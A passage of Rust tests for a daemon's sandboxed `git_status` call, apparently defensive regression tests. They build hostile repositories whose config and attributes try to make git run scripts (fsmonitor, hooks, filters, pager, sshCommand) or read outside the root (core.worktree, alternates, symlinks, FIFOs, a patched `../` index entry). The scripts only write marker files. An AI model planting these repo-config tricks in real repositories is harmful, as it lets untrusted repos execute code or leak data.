                .args(["-c", "user.name=T", "-c", "user.email=t@example.com"])
                .args(args)
                .current_dir(dir)
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .output()
                .unwrap()
        }

        /// A script that records that it ran (and passes stdin through, so a
        /// `clean` filter does not fail the status by itself).
        #[cfg(unix)]
        fn marker_script(dir: &Path, name: &str) -> (PathBuf, PathBuf) {
            use std::os::unix::fs::PermissionsExt;
            let marker = dir.join(format!("{name}.marker"));
            let script = dir.join(format!("{name}.sh"));
            std::fs::write(
                &script,
                format!("#!/bin/sh\necho ran >> \"{}\"\ncat\n", marker.display()),
            )
            .unwrap();
            let mut perms = std::fs::metadata(&script).unwrap().permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(&script, perms).unwrap();
            (script, marker)
        }

        /// A repo whose own config and tracked `.gitattributes` try every way
        /// of making `git status` run code: fsmonitor, hooksPath, `clean` /
        /// `smudge` / `process` filters (one defined through an `include`), a
        /// textconv / external diff, a pager, an ssh command and a
        /// `core.worktree` pointing outside the repo. Tracked files are
        /// stat-dirty, so git really does need to run the filters.
        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_malicious_repo_config_never_executes_scripts() {
            let d = daemon();
            let r = &d.router;
            let scripts = d.allowed.join("scripts");
            std::fs::create_dir_all(&scripts).unwrap();
            let repo = d.allowed.join("evil-repo");
            std::fs::create_dir_all(&repo).unwrap();
            assert!(git_in(&repo, &["init", "-q"]).status.success());

            let names = [
                "fsmonitor",
                "hook",
                "clean",
                "smudge",
                "process",
                "inc",
                "textconv",
                "extdiff",
                "pager",
                "ssh",
            ];
            let mut markers = std::collections::HashMap::new();
            let mut scr = std::collections::HashMap::new();
            for n in names {
                let (s_, m_) = marker_script(&scripts, n);
                scr.insert(n, s_);
                markers.insert(n, m_);
            }
            let outside_wt = d.allowed.join("worktree-elsewhere");
            std::fs::create_dir_all(&outside_wt).unwrap();
            std::fs::write(outside_wt.join("leak.txt"), "x").unwrap();

            // Commit first (clean config), then arm the config and dirty the stats.
            std::fs::write(
                repo.join(".gitattributes"),
                "a.txt filter=evil diff=evil\nb.txt filter=inc\nc.txt filter=proc\n",
            )
            .unwrap();
            for f in ["a.txt", "b.txt", "c.txt"] {
                std::fs::write(repo.join(f), "hello\n").unwrap();
            }
            assert!(git_in(&repo, &["add", "-A"]).status.success());
            assert!(git_in(&repo, &["commit", "-qm", "init"]).status.success());

            let sc = |n: &str| scr[n].display().to_string();
            std::fs::write(
                repo.join(".git/included.cfg"),
                format!(
                    "[filter \"inc\"]\n\tclean = {}\n\tsmudge = {}\n",
                    sc("inc"),
                    sc("inc")
                ),
            )
            .unwrap();
            let mut cfg = std::fs::read_to_string(repo.join(".git/config")).unwrap();
            cfg.push_str(&format!(
                "[core]\n\tfsmonitor = {fsm}\n\thooksPath = {hk}\n\tpager = {pg}\n\tsshCommand = {ssh}\n\tworktree = {wt}\n\
                 [filter \"evil\"]\n\tclean = {cl}\n\tsmudge = {sm}\n\trequired = true\n\
                 [filter \"proc\"]\n\tprocess = {pr}\n\
                 [diff \"evil\"]\n\ttextconv = {tc}\n\tcommand = {xd}\n\
                 [diff]\n\texternal = {xd}\n\
                 [include]\n\tpath = included.cfg\n",
                fsm = sc("fsmonitor"),
                hk = scripts.display(),
                pg = sc("pager"),
                ssh = sc("ssh"),
                wt = outside_wt.display(),
                cl = sc("clean"),
                sm = sc("smudge"),
                pr = sc("process"),
                tc = sc("textconv"),
                xd = sc("extdiff"),
            ));
            std::fs::write(repo.join(".git/config"), cfg).unwrap();
            // core.worktree moved the work tree; the checks below use the real one.
            let touch = |repo: &Path| {
                for f in ["a.txt", "b.txt", "c.txt"] {
                    let p = repo.join(f);
                    let t = std::fs::read(&p).unwrap();
                    std::fs::write(&p, t).unwrap();
                }
            };

            // Guard against a vacuous test: with this config, plain git DOES run
            // the fsmonitor and the filters. (Worktree pinned like the arm does.)
            let plain = |repo: &Path| {
                touch(repo);
                std::process::Command::new("git")
                    .args(["status", "--porcelain"])
                    .current_dir(repo)
                    .env("GIT_CONFIG_NOSYSTEM", "1")
                    .env("GIT_CONFIG_GLOBAL", "/dev/null")
                    .env("GIT_DIR", repo.join(".git"))
                    .env("GIT_WORK_TREE", repo)
                    .output()
                    .unwrap();
            };
            plain(&repo);
            for n in ["fsmonitor", "clean", "inc"] {
                assert!(
                    markers[n].exists(),
                    "test setup is vacuous: plain git did not run the `{n}` script"
                );
            }
            for m in markers.values() {
                let _ = std::fs::remove_file(m);
            }

            touch(&repo);
            let got = ok(r, "git_status", json!({ "root": s(&repo) })).await;
            assert!(got.is_object(), "expected a status object, got: {got:?}");
            for (n, m) in &markers {
                assert!(!m.exists(), "the `{n}` script was executed by git_status");
            }
            // `core.worktree` did not move the work tree outside the repo.
            let leaked = got.to_string().contains("leak.txt");
            assert!(!leaked, "work tree escaped the root: {got}");
        }

        /// Filter drivers declared in every odd way the config can: through an
        /// include, odd-case / dotted / spaced names, `process`, attributes in
        /// `.git/info/attributes`, in a linked worktree's common config. None
        /// may run, and no enumeration of the config exists to be raced.
        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_filter_forms_never_execute() {
            let d = daemon();
            let r = &d.router;
            let scripts = d.allowed.join("scripts2");
            std::fs::create_dir_all(&scripts).unwrap();
            let repo = d.allowed.join("evil-filters");
            std::fs::create_dir_all(&repo).unwrap();
            assert!(git_in(&repo, &["init", "-q"]).status.success());
            let names = ["upper", "dotted", "spaced", "lfs", "info", "worktreecfg"];
            let mut markers = Vec::new();
            let mut scr = std::collections::HashMap::new();
            for n in names {
                let (s_, m_) = marker_script(&scripts, n);
                scr.insert(n, s_);
                markers.push((n, m_));
            }
            let sc = |n: &str| scr[n].display().to_string();
            std::fs::write(
                repo.join(".gitattributes"),
                "u.txt filter=UPPER\nd.txt filter=a.b.c\ns.txt filter=\"e v\"\nl.txt filter=lfs\n",
            )
            .unwrap();
            for f in ["u.txt", "d.txt", "s.txt", "l.txt", "i.txt", "w.txt"] {
                std::fs::write(repo.join(f), "hello\n").unwrap();
            }
            assert!(git_in(&repo, &["add", "-A"]).status.success());
            assert!(git_in(&repo, &["commit", "-qm", "init"]).status.success());
            std::fs::write(
                repo.join(".git/info/attributes"),
                "i.txt filter=info\nw.txt filter=worktreecfg\n",
            )
            .unwrap();
            std::fs::write(
                repo.join(".git/more.cfg"),
                format!(
                    "[FILTER \"UPPER\"]\n\tClean = {u}\n[filter \"a.b.c\"]\n\tclean = {d}\n\
                     [Filter \"e v\"]\n\tprocess = {s}\n[filter \"lfs\"]\n\tclean = {l}\n\tprocess = {l}\n\trequired = true\n",
                    u = sc("upper"),
                    d = sc("dotted"),
                    s = sc("spaced"),
                    l = sc("lfs"),
                ),
            )
            .unwrap();
            let mut cfg = std::fs::read_to_string(repo.join(".git/config")).unwrap();
            cfg.push_str(&format!(
                "[include]\n\tpath = more.cfg\n[includeIf \"gitdir:**\"]\n\tpath = more.cfg\n\
                 [filter \"info\"]\n\tclean = {i}\n[filter \"worktreecfg\"]\n\tclean = {w}\n",
                i = sc("info"),
                w = sc("worktreecfg"),
            ));
            std::fs::write(repo.join(".git/config"), cfg).unwrap();
            for f in ["u.txt", "d.txt", "s.txt", "l.txt", "i.txt", "w.txt"] {
                let p = repo.join(f);
                let t = std::fs::read(&p).unwrap();
                std::fs::write(&p, t).unwrap();
            }
            // Vacuous-test guard: plain git does run at least the info filter.
            std::process::Command::new("git")
                .args(["status", "--porcelain"])
                .current_dir(&repo)
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .output()
                .unwrap();
            assert!(
                markers.iter().any(|(_, m)| m.exists()),
                "test setup is vacuous: plain git ran no filter"
            );
            for (_, m) in &markers {
                let _ = std::fs::remove_file(m);
            }
            for f in ["u.txt", "d.txt", "s.txt", "l.txt", "i.txt", "w.txt"] {
                let p = repo.join(f);
                let t = std::fs::read(&p).unwrap();
                std::fs::write(&p, t).unwrap();
            }
            // Call it repeatedly while the config flips: nothing may ever run.
            for round in 0..6 {
                if round % 2 == 1 {
                    let mut c = std::fs::read_to_string(repo.join(".git/config")).unwrap();
                    c.push_str("\n[filter \"late\"]\n\tclean = /bin/false\n");
                    std::fs::write(repo.join(".git/config"), c).unwrap();
                }
                let got = ok(r, "git_status", json!({ "root": s(&repo) })).await;
                assert!(got.is_object(), "{got:?}");
                for (n, m) in &markers {
                    assert!(!m.exists(), "filter `{n}` ran (round {round})");
                }
            }
        }

        /// The sandbox config keeps what status needs: upstream tracking
        /// (ahead/behind) and the linked-worktree layout (`commondir`).
        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_keeps_upstream_and_linked_worktrees() {
            let d = daemon();
            let r = &d.router;
            let origin = d.allowed.join("up-origin");
            let repo = d.allowed.join("up-clone");
            std::fs::create_dir_all(&origin).unwrap();
            assert!(git_in(&origin, &["init", "-q", "-b", "main"])
                .status
                .success());
            std::fs::write(origin.join("a.txt"), "a\n").unwrap();
            assert!(git_in(&origin, &["add", "-A"]).status.success());
            assert!(git_in(&origin, &["commit", "-qm", "one"]).status.success());
            assert!(std::process::Command::new("git")
                .args(["clone", "-q", &s(&origin), &s(&repo)])
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .output()
                .unwrap()
                .status
                .success());
            std::fs::write(repo.join("b.txt"), "b\n").unwrap();
            assert!(git_in(&repo, &["add", "-A"]).status.success());
            assert!(git_in(&repo, &["commit", "-qm", "two"]).status.success());
            let got = ok(r, "git_status", json!({ "root": s(&repo) })).await;
            assert_eq!(got["branch"], "main", "{got}");
            assert_eq!(got["ahead"], 1, "{got}");
            assert_eq!(got["behind"], 0, "{got}");

            let wt = d.allowed.join("up-wt");
            assert!(
                git_in(&repo, &["worktree", "add", "-q", "-b", "side", &s(&wt)])
                    .status
                    .success()
            );
            std::fs::write(wt.join("loose.txt"), "x").unwrap();
            let got = ok(r, "git_status", json!({ "root": s(&wt) })).await;
            assert_eq!(got["branch"], "side", "{got}");
            assert!(
                got["untracked"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .any(|f| f["path"] == "loose.txt"),
                "{got}"
            );
        }

        #[tokio::test]
        async fn git_status_never_reads_a_repo_above_the_root() {
            let d = daemon();
            let r = &d.router;
            let outer = d.allowed.join("outer");
            let inner = outer.join("inner");
            std::fs::create_dir_all(&inner).unwrap();
            assert!(git_in(&outer, &["init", "-q"]).status.success());
            std::fs::write(outer.join("private-outside-inner.txt"), "x").unwrap();
            std::fs::write(inner.join("inside.txt"), "x").unwrap();
            // `inner` is not a repo of its own: reads as "not a repository".
            let got = ok(r, "git_status", json!({ "root": s(&inner) })).await;
            assert_eq!(got, Value::Null, "{got}");
        }

        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_refuses_a_symlinked_dot_git() {
            let d = daemon();
            let r = &d.router;
            let other = d.allowed.join("other-repo");
            let proj = d.allowed.join("proj");
            std::fs::create_dir_all(&other).unwrap();
            std::fs::create_dir_all(&proj).unwrap();
            assert!(git_in(&other, &["init", "-q"]).status.success());
            symlink(&other.join(".git"), &proj.join(".git"));
            let e = err(r, "git_status", json!({ "root": s(&proj) })).await;
            assert!(e.contains("symlink"), "{e}");
        }

        /// Commit one file in a fresh repo at `dir` (branch `main`).
        fn init_repo(dir: &Path, files: &[(&str, &str)]) {
            std::fs::create_dir_all(dir).unwrap();
            assert!(git_in(dir, &["init", "-q", "-b", "main"]).status.success());
            for (f, body) in files {
                if let Some(parent) = Path::new(f).parent() {
                    std::fs::create_dir_all(dir.join(parent)).unwrap();
                }
                std::fs::write(dir.join(f), body).unwrap();
            }
            assert!(git_in(dir, &["add", "-A"]).status.success());
            assert!(git_in(dir, &["commit", "-qm", "init"]).status.success());
        }

        #[cfg(unix)]
        fn mkfifo(p: &Path) {
            use std::os::unix::ffi::OsStrExt as _;
            let c = std::ffi::CString::new(p.as_os_str().as_bytes()).unwrap();
            assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
        }

        /// Minimal SHA-1, to re-seal a hand-patched index (git checks its
        /// trailing checksum).
        fn sha1(data: &[u8]) -> [u8; 20] {
            let mut h: [u32; 5] = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0];
            let mut msg = data.to_vec();
            msg.push(0x80);
            while msg.len() % 64 != 56 {
                msg.push(0);
            }
            msg.extend_from_slice(&((data.len() as u64) * 8).to_be_bytes());
            for chunk in msg.chunks(64) {
                let mut w = [0u32; 80];
                for i in 0..16 {
                    w[i] = u32::from_be_bytes(chunk[i * 4..i * 4 + 4].try_into().unwrap());
                }
                for i in 16..80 {
                    w[i] = (w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]).rotate_left(1);
                }
                let [mut a, mut b, mut c, mut d, mut e] = h;
                for (i, wi) in w.iter().enumerate() {
                    let (f, k) = match i {
                        0..=19 => ((b & c) | (!b & d), 0x5A827999),
                        20..=39 => (b ^ c ^ d, 0x6ED9EBA1),
                        40..=59 => ((b & c) | (b & d) | (c & d), 0x8F1BBCDC),
                        _ => (b ^ c ^ d, 0xCA62C1D6u32),
                    };
                    let t = a
                        .rotate_left(5)
                        .wrapping_add(f)
                        .wrapping_add(e)
                        .wrapping_add(k)
                        .wrapping_add(*wi);
                    e = d;
                    d = c;
                    c = b.rotate_left(30);
                    b = a;
                    a = t;
                }
                h[0] = h[0].wrapping_add(a);
                h[1] = h[1].wrapping_add(b);
                h[2] = h[2].wrapping_add(c);
                h[3] = h[3].wrapping_add(d);
                h[4] = h[4].wrapping_add(e);
            }
            let mut out = [0u8; 20];
            for (i, v) in h.iter().enumerate() {
                out[i * 4..i * 4 + 4].copy_from_slice(&v.to_be_bytes());
            }
            out
        }

        #[test]
        fn sha1_helper_matches_known_vector() {
            assert_eq!(
                hex::encode(sha1(b"abc")),
                "a9993e364706816aba3e25717850c26c9cd0d89d"
            );
        }

        /// ROUND-3 #1: `objects/info/alternates` made git read any object
        /// store the serving principal could read. A repo that names one is
        /// refused with a reason; the outside names never come back.
        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_refuses_alternates_and_leaks_no_outside_names() {
            let d = daemon();
            let r = &d.router;
            let secret = d.outside.join("secret-repo");
            init_repo(
                &secret,
                &[("PRIVATE-ROADMAP.md", "x"), ("hr/SALARIES-2026.xlsx", "y")],
            );
            let oid = String::from_utf8(git_in(&secret, &["rev-parse", "HEAD"]).stdout).unwrap();
            let repo = d.allowed.join("alt-repo");
            init_repo(&repo, &[("a.txt", "a")]);
            std::fs::write(
                repo.join(".git/objects/info/alternates"),
                format!("{}\n", secret.join(".git/objects").display()),
            )
            .unwrap();
            std::fs::write(repo.join(".git/HEAD"), oid).unwrap();
            let e = err(r, "git_status", json!({ "root": s(&repo) })).await;
            assert!(e.contains("alternate"), "{e}");
            assert!(
                !e.contains("PRIVATE-ROADMAP") && !e.contains("SALARIES"),
                "{e}"
            );
            // A comment-only / empty alternates file names no store: still served.
            std::fs::write(repo.join(".git/objects/info/alternates"), "# none\n\n").unwrap();
            std::fs::write(repo.join(".git/HEAD"), "ref: refs/heads/main\n").unwrap();
            let got = ok(r, "git_status", json!({ "root": s(&repo) })).await;
            assert_eq!(got["branch"], "main", "{got}");
        }

        /// ROUND-3 #1: a symlink under `refs/` or `objects/` points git at
        /// data outside the allowlist.
        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_refuses_symlinks_under_refs_and_objects() {
            let d = daemon();
            let r = &d.router;
            let out_ref = d.outside.join("ref-file");
            std::fs::write(&out_ref, "0123456789012345678901234567890123456789\n").unwrap();
            let out_dir = d.outside.join("some-dir");
            std::fs::create_dir_all(&out_dir).unwrap();

            let repo = d.allowed.join("sym-refs");
            init_repo(&repo, &[("a.txt", "a")]);
            std::fs::remove_file(repo.join(".git/refs/heads/main")).unwrap();
            symlink(&out_ref, &repo.join(".git/refs/heads/main"));
            let e = err(r, "git_status", json!({ "root": s(&repo) })).await;
            assert!(e.contains("symlink"), "{e}");

            let repo = d.allowed.join("sym-pack");
            init_repo(&repo, &[("a.txt", "a")]);
            assert!(git_in(&repo, &["gc", "-q"]).status.success());
            let pack = std::fs::read_dir(repo.join(".git/objects/pack"))
                .unwrap()
                .map(|e| e.unwrap().path())
                .find(|p| p.extension().is_some_and(|x| x == "pack"))
                .unwrap();
            let moved = d.outside.join("moved.pack");
            std::fs::rename(&pack, &moved).unwrap();
            symlink(&moved, &pack);
            let e = err(r, "git_status", json!({ "root": s(&repo) })).await;
            assert!(e.contains("symlink"), "{e}");

            let repo = d.allowed.join("sym-fanout");
            init_repo(&repo, &[("a.txt", "a")]);
            let fan = std::fs::read_dir(repo.join(".git/objects"))
                .unwrap()
                .map(|e| e.unwrap().path())
                .find(|p| p.is_dir() && p.file_name().unwrap().len() == 2)
                .unwrap();
            std::fs::remove_dir_all(&fan).unwrap();
            symlink(&out_dir, &fan);
            let e = err(r, "git_status", json!({ "root": s(&repo) })).await;
            assert!(e.contains("symlink"), "{e}");
        }

        /// ROUND-3 #2: a FIFO where a repo file should be hung every route of
        /// the daemon (a blocking `read` on an async worker). Now each is a
        /// prompt error, and an unrelated request still answers meanwhile.
        #[cfg(unix)]
        #[test]
        fn git_status_fifo_files_do_not_hang_the_daemon() {
            let (tx, rx) = std::sync::mpsc::channel();
            std::thread::spawn(move || {
                let rt = tokio::runtime::Builder::new_multi_thread()
                    .worker_threads(2)
                    .enable_all()
                    .build()
                    .unwrap();
                let res = rt.block_on(async {
                    let d = daemon();
                    let good = d.allowed.join("good");
                    init_repo(&good, &[("a.txt", "a")]);
                    // HEAD, commondir and the `.git` file itself as FIFOs.
                    let head = d.allowed.join("fifo-head");
                    init_repo(&head, &[("a.txt", "a")]);
                    std::fs::remove_file(head.join(".git/HEAD")).unwrap();
                    mkfifo(&head.join(".git/HEAD"));
                    let com = d.allowed.join("fifo-commondir");
                    init_repo(&com, &[("a.txt", "a")]);
                    mkfifo(&com.join(".git/commondir"));
                    let dot = d.allowed.join("fifo-dotgit");
                    std::fs::create_dir_all(&dot).unwrap();
                    mkfifo(&dot.join(".git"));
                    let mut tasks = Vec::new();
                    for root in [&head, &com, &dot] {
                        for _ in 0..4 {
                            let router = d.router.clone();
                            let root = s(root);
                            tasks.push(tokio::spawn(async move {
                                rpc(&router, "git_status", json!({ "root": root })).await
                            }));
                        }
                    }
                    let unrelated = tokio::time::timeout(
                        std::time::Duration::from_secs(10),
                        rpc(&d.router, "git_status", json!({ "root": s(&good) })),
                    )
                    .await
                    .expect("an unrelated request must still be answered");
                    assert_eq!(unrelated["ok"], true, "{unrelated}");
                    for t in tasks {
                        let v = tokio::time::timeout(std::time::Duration::from_secs(10), t)
                            .await
                            .expect("a FIFO repo file must fail promptly")
                            .unwrap();
                        assert_eq!(v["ok"], false, "{v}");
                    }
                });
                let _ = tx.send(res);
            });
            rx.recv_timeout(std::time::Duration::from_secs(60))
                .expect("git_status hung on a FIFO repo file");
        }

        /// ROUND-3 #3: an index entry `../x` made git `lstat` outside the
        /// root and the arm echo the path back (an existence oracle).
        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_refuses_an_index_naming_paths_outside_the_root() {
            let d = daemon();
            let r = &d.router;
            let repo = d.allowed.join("idx-escape");
            init_repo(&repo, &[("a.txt", "a")]);
            std::fs::write(d.outside.join("exists.txt"), "x").unwrap();
            let p = repo.join(".git/index");
            let mut b = std::fs::read(&p).unwrap();
            b.truncate(b.len() - 20);
            let at = b.windows(5).position(|w| w == b"a.txt").unwrap();
            b[at..at + 5].copy_from_slice(b"../.x");
            let sum = sha1(&b);
            b.extend_from_slice(&sum);
            std::fs::write(&p, b).unwrap();
            let e = err(r, "git_status", json!({ "root": s(&repo) })).await;
            assert!(
                e.contains("the index names a path outside the project"),
                "the pre-scan must be what fires: {e}"
            );
            assert!(!e.contains("exists.txt"), "{e}");
        }

        /// ROUND-4: git calls an entry "racily clean" when its mtime is not
        /// older than the INDEX FILE's. The sandbox copy of the index used to be
        /// stamped "now", so a same-size rewrite made in the same second as the
        /// last index write read as clean (no badge, a lower modified count).
        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_sees_a_same_second_same_size_rewrite() {
            use std::os::unix::fs::MetadataExt as _;
            let d = daemon();
            let r = &d.router;
            let mut hit = false;
            for i in 0..30 {
                let repo = d.allowed.join(format!("racy{i}"));
                init_repo(&repo, &[("notes.md", "aaaa")]);
                std::fs::write(repo.join("notes.md"), "bbbb").unwrap();
                let idx = std::fs::metadata(repo.join(".git/index")).unwrap().mtime();
                let wt = std::fs::metadata(repo.join("notes.md")).unwrap().mtime();
                if idx != wt {
                    continue; // second boundary crossed: not the racy case
                }
                hit = true;
                // Let the sandbox copy be made well after the index write.
                tokio::time::sleep(std::time::Duration::from_millis(1100)).await;
                let got = ok(r, "git_status", json!({ "root": s(&repo) })).await;
                assert!(got["unstaged"].to_string().contains("notes.md"), "{got}");
                break;
            }
            assert!(hit, "setup never produced a same-second rewrite");
        }

        /// ROUND-4: a FIFO under refs/ is refused up front, not waited on.
        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_refuses_a_fifo_under_refs_promptly() {
            let d = daemon();
            let r = &d.router;
            let repo = d.allowed.join("frefs");
            init_repo(&repo, &[("a.txt", "a")]);
            std::fs::remove_file(repo.join(".git/refs/heads/main")).unwrap();
            mkfifo(&repo.join(".git/refs/heads/main"));
            let started = std::time::Instant::now();
            let e = err(r, "git_status", json!({ "root": s(&repo) })).await;
            assert!(started.elapsed() < std::time::Duration::from_secs(3), "{e}");
            assert!(e.contains("not a regular file"), "{e}");
        }

        /// ROUND-3 #4: split-index and shallow repositories are ordinary and
        /// were answered with `null` ("not a repository") because the sandbox
        /// lacked `sharedindex.*` / `shallow`. Index v4 and sha256 too.
        #[cfg(unix)]
        #[tokio::test]
        async fn git_status_serves_split_index_shallow_v4_and_sha256_repos() {
            let d = daemon();
            let r = &d.router;

            let split = d.allowed.join("split");
            init_repo(&split, &[("a.txt", "a"), ("b.txt", "b")]);
            assert!(git_in(&split, &["update-index", "--split-index"])
                .status
                .success());
            std::fs::write(split.join("a.txt"), "changed").unwrap();
            assert!(git_in(&split, &["add", "b.txt"]).status.success());
            std::fs::write(split.join("new.txt"), "n").unwrap();
            let has_shared = std::fs::read_dir(split.join(".git")).unwrap().any(|e| {
                e.unwrap()
                    .file_name()
                    .to_string_lossy()
                    .starts_with("sharedindex.")
            });
            assert!(has_shared, "setup: no shared index was written");
            let got = ok(r, "git_status", json!({ "root": s(&split) })).await;
            assert_eq!(got["branch"], "main", "{got}");
            assert!(got["unstaged"].to_string().contains("a.txt"), "{got}");
            assert!(got["untracked"].to_string().contains("new.txt"), "{got}");

            let origin = d.allowed.join("sh-origin");
            init_repo(&origin, &[("a.txt", "1")]);
            std::fs::write(origin.join("a.txt"), "2").unwrap();
            assert!(git_in(&origin, &["commit", "-qam", "two"]).status.success());
            let shallow = d.allowed.join("shallow");
            assert!(std::process::Command::new("git")
                .args([
                    "clone",
                    "-q",
                    "--depth",
                    "1",
                    &format!("file://{}", s(&origin)),
                    &s(&shallow)
                ])
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .output()
                .unwrap()
                .status
                .success());
            assert!(shallow.join(".git/shallow").exists(), "setup: not shallow");
            std::fs::write(shallow.join("loose.txt"), "x").unwrap();
            let got = ok(r, "git_status", json!({ "root": s(&shallow) })).await;
            assert_eq!(got["branch"], "main", "{got}");
            assert!(got["untracked"].to_string().contains("loose.txt"), "{got}");

            let v4 = d.allowed.join("v4");
            init_repo(
                &v4,
                &[
                    ("dir/one.txt", "1"),
                    ("dir/two.txt", "2"),
                    ("dir/sub/three.txt", "3"),
                ],
            );
            assert!(git_in(&v4, &["update-index", "--index-version", "4"])
                .status
                .success());
            std::fs::write(v4.join("dir/sub/three.txt"), "changed").unwrap();
            let got = ok(r, "git_status", json!({ "root": s(&v4) })).await;
            assert!(
                got["unstaged"].to_string().contains("dir/sub/three.txt"),
                "{got}"
            );

            let sha256 = d.allowed.join("sha256");
            std::fs::create_dir_all(&sha256).unwrap();
            if git_in(
                &sha256,
                &["init", "-q", "-b", "main", "--object-format=sha256"],
            )
            .status
            .success()
            {
                std::fs::write(sha256.join("a.txt"), "a").unwrap();
                assert!(git_in(&sha256, &["add", "-A"]).status.success());
                assert!(git_in(&sha256, &["commit", "-qm", "i"]).status.success());
                std::fs::write(sha256.join("a.txt"), "changed").unwrap();
                let got = ok(r, "git_status", json!({ "root": s(&sha256) })).await;
                assert!(got["unstaged"].to_string().contains("a.txt"), "{got}");
            }
        }

        #[tokio::test]
        async fn git_status_returns_matching_shape_for_valid_repo() {
            let d = daemon();
            let r = &d.router;
            let repo = d.allowed.join("valid-repo");
            std::fs::create_dir_all(&repo).unwrap();

            assert!(std::process::Command::new("git")
                .arg("init")
                .current_dir(&repo)
                .output()
                .unwrap()
                .status
                .success());

            std::fs::write(repo.join("tracked.txt"), "initial\n").unwrap();
            assert!(std::process::Command::new("git")
                .args([
                    "-c",
                    "user.name=Test",
                    "-c",
                    "user.email=test@example.com",
                    "add",
                    "tracked.txt"
                ])
                .current_dir(&repo)
                .output()
                .unwrap()
                .status
                .success());
            assert!(std::process::Command::new("git")
                .args([
                    "-c",
                    "user.name=Test",
                    "-c",
                    "user.email=test@example.com",
                    "commit",
                    "-m",
                    "init"
                ])
                .current_dir(&repo)
                .output()
                .unwrap()
                .status
                .success());

            std::fs::write(repo.join("tracked.txt"), "modified\n").unwrap();
            std::fs::write(repo.join("untracked.txt"), "untracked\n").unwrap();
            std::fs::write(repo.join("staged.txt"), "staged\n").unwrap();
            assert!(std::process::Command::new("git")
                .args(["add", "staged.txt"])
                .current_dir(&repo)
                .output()
                .unwrap()
                .status
                .success());

            let got = ok(r, "git_status", json!({ "root": s(&repo) })).await;
            assert!(got.is_object());
            assert!(got["branch"].is_string());
            assert_eq!(got["detached"], false);
            assert_eq!(got["modified"], 3);
            assert!(got["staged"]
                .as_array()
                .unwrap()
                .iter()
                .any(|f| f["path"] == "staged.txt"));
            assert!(got["unstaged"]
                .as_array()
                .unwrap()
                .iter()
                .any(|f| f["path"] == "tracked.txt"));
            assert!(got["untracked"]
                .as_array()
                .unwrap()
                .iter()
                .any(|f| f["path"] == "untracked.txt"));
        }
    }
}
